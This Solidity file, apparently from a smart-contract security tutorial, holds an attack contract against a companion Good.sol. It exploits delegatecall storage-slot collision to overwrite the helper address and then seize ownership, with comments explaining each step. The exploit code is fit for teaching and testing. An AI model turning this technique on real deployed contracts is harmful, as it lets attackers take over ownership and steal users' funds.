//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./Good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        /*
        Within the Helper contract when the setNum is executed,
        it sets the _num which in our case right now is the address of Attack.sol typecasted into a uint into num.
        Note that because num is located at Slot 0 of Helper contract, 
        it will actually assign the address of Attack.sol to Slot 0 of Good.sol.
        Woops... You may see where this is going. Slot 0 of Good is the helper variable,
        which means, the attacker has successfully been able to update the helper address variable to it's own contract now.
        */
        // This is the way you typecast an address to a uint
        good.setNum(uint(uint160(address(this))));
        /* 
        Now the address of the helper contract has been overwritten by the address of Attack.sol. 
        The number 1 plays no relevance here, and could've been set to anything.
        Now when setNum gets called within Good.sol it will delegate the call to Attack.sol because the address of helper contract has been overwritten.
        */
        good.setNum(1);
        /**
         * The setNum within Attack.sol gets executed which sets the owner to msg.sender which in this case is Attack.sol itself because it was the original caller of the delegatecall and because owner is at Slot 1 of Attack.sol, the Slot 1 of Good.sol will be overwriten which is its owner.
        */
    }
}
